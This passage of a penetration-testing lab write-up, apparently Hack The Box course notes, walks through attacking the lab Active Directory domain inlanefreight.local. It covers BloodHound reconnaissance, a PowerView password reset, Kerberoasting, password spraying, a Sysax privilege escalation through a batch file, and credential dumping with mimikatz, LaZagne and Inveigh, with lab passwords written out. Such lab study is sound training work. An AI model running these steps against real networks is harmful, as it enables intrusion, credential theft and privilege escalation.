```cmd
c:\DotNetNuke\Portals\0> SharpHound.exe -c All
```

Next, we can start the `neo4j` service (`sudo neo4j start`), type `bloodhound` to open the GUI tool, and ingest the data.
![](Lateral%20Movement-20260903-203118.png)
![](Lateral%20Movement-20260903-203215.png)

We can use [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) to change the `ssmalls` user's password.

```shell
3kjS@htb[/htb]$ proxychains nmap -sT -p 3389 172.16.8.20

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 13:35 EDT
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.20:80-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.20:3389-<><>-OK
Nmap scan report for 172.16.8.20
Host is up (0.11s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds 
```

The command allows us to pass all RDP traffic to `DEV01` through the `dmz01` host via local port 13389.

```shell
ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111
```

Once this port forward is set up, we can use `xfreerdp` to connect to the host using drive redirection to transfer files back and forth easily.

```shell
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools"
```

```cmd
c:\DotNetNuke\Portals\0> net use

New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
                       \\TSCLIENT\home           Microsoft Terminal Services
The command completed successfully.


c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\PowerView.ps1 .
        1 file(s) copied.
```

```powershell
PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1

PS C:\DotNetNuke\Portals\0> Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose

VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'ssmalls'
VERBOSE: [Set-DomainUserPassword] Password for user 'ssmalls' successfully reset
```

```shell
3kjS@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!
```
# Share Hunting

```cmd
c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\Snaffler.exe
        1 file(s) copied.

c:\DotNetNuke\Portals\0> Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

```shell
3kjS@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'
```
![](Screenshot%202026-09-03%20at%2020.36.49.png)

This creates a file for us in our `/tmp` directory so let's look through it.

```shell
3kjS@htb[/htb]$ cat 172.16.8.3.json 
{
    "Department Shares": {
        "IT/Private/Development/SQL Express Backup.ps1": {
            "atime_epoch": "2022-06-01 14:34:16",
            "ctime_epoch": "2022-06-01 14:34:16",
            "mtime_epoch": "2022-06-01 14:35:16",
            "size": "3.91 KB"
        }
    },
    "IPC$": {
        "323a2fd620dcf3e3": {
            "atime_epoch": "1600-12-31 19:03:58",
            "ctime_epoch": "1600-12-31 19:03:58",
            "mtime_epoch": "1600-12-31 19:03:58",
            "size": "3 Bytes"
<SNIP>
```

```shell
3kjS@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares'
```
![](Screenshot%202026-09-03%20at%2020.37.51.png)

Then we can browse to the `Development` share.

```shell
smb: \IT\Private\> cd Development\
smb: \IT\Private\Development\> ls
```

```shell
3kjS@htb[/htb]$ cat SQL\ Express\ Backup.ps1
```
![](Screenshot%202026-09-03%20at%2020.39.07.png)

```shell
3kjS@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/sysvol'
```
![](Screenshot%202026-09-03%20at%2020.39.26.png)

Digging through the script we find another set of credentials: `account:L337^p@$$w0rD`

```shell
3kjS@htb[/htb]$ cat adum.vbs
```
![](Screenshot%202026-09-03%20at%2020.40.37.png)
## Kerberoasting

```powershell
PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1 
PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN |Select samaccountname
```
![](Screenshot%202026-09-03%20at%2020.43.05.png)

```powershell
PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainUser] Searching for non-null service principal names
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=*))(servicePrincipalName=*))
```

```shell
3kjS@htb[/htb]$ hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting... 

<SNIP> 

$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local*$31b8f218c848bd851df59641a45<SNIP>:<redacted>
```
## Password Spraying

We can use [DomainPasswordSpray.ps1](https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1) or the Windows version of Kerbrute from the DEV01 host or use Kerbrute from our attack host via Proxychains (all worth playing around with).

```powershell
PS C:\DotNetNuke\Portals\0> Invoke-DomainPasswordSpray -Password Welcome1
```
![](Screenshot%202026-09-03%20at%2020.44.45.png)
## Misc Techniques

```shell
3kjS@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
```

```powershell
PS C:\DotNetNuke\Portals\0> Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}

samaccountname description
-------------- -----------
Administrator  Built-in account for administering the computer/domain
frontdesk      ILFreightLobby!
Guest          Built-in account for guest access to the computer/d...
krbtgt         Key Distribution Center Service Account
```
## Next Steps

```shell
3kjS@htb[/htb]$ proxychains nmap -sT -p 5985 172.16.8.50

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 14:59 EDT
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:80-<--timeout
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
Nmap scan report for 172.16.8.50
Host is up (0.12s latency).

PORT     STATE SERVICE
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```

```shell
3kjS@htb[/htb]$ proxychains evil-winrm -i 172.16.8.50 -u backupadm
```

```shell
*Evil-WinRM* PS C:\Users\backupadm\desktop> cd c:\panther

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\panther> dir


    Directory: C:\panther


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/1/2022   2:17 PM           6995 unattend.xml
```

```shell
*Evil-WinRM* PS C:\panther> type unattend.xml
```
![](Screenshot%202026-09-03%20at%2020.50.08.png)

We find credentials for the local user `ilfserveradm`, with the password `Sys26Admin`.

```shell
*Evil-WinRM* PS C:\panther> net user ilfserveradm
```

A quick search yields [this](https://www.exploit-db.com/exploits/50834) local privilege escalation exploit.

First, create a file called `pwn.bat` in `C:\Users\ilfserveradm\Documents` containing the line `net localgroup administrators ilfserveradm /add` to add our user to the local admins group (sometime we'd need to clean up and note down in our report appendices). Next, we can perform the following steps:

- Open `C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe`
- Select `Setup Scheduled/Triggered Tasks`
- Add task (Triggered)
- Update folder to monitor to be `C:\Users\ilfserveradm\Documents`
- Check `Run task if a file is added to the monitor folder or subfolder(s)`
- Choose `Run any other Program` and choose `C:\Users\ilfserveradm\Documents\pwn.bat`
- Uncheck `Login as the following user to run task`
- Click `Finish` and then `Save`

Finally, to trigger the task, create a new .txt file in the `C:\Users\ilfserveradm\Documents` directory. We can check and see that the `ilfserveradm` user was added to the `Administrators` group.

```shell
C:\Users\ilfserveradm> net localgroup administrators
```
## Post-Exploitation/Pillaging

```cmd
c:\Users\ilfserveradm\Documents> mimikatz.exe

mimikatz # log

mimikatz # privilege::debug

mimikatz # token::elevate

mimikatz # lsadump::secrets
```

We find a set password but no associated username. This appears to be for an account configured with autologon, so we can query the Registry to find the username.

```powershell
PS C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
```

We see Firefox installed, so we can grab the [LaZagne tool](https://github.com/AlessandroZ/LaZagne) to try to dump any credentials saved in the browser. No luck, but always worth a check.

```cmd
c:\Users\ilfserveradm\Documents> lazagne.exe browsers -firefox
```

It's also worth running [Inveigh](https://github.com/Kevin-Robertson/Inveigh) once we have local admin on a host to see if we can obtain password hashes for any users.

```powershell
PS C:\Users\ilfserveradm\Documents> Import-Module .\Inveigh.ps1 
PS C:\Users\ilfserveradm\Documents> Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
```
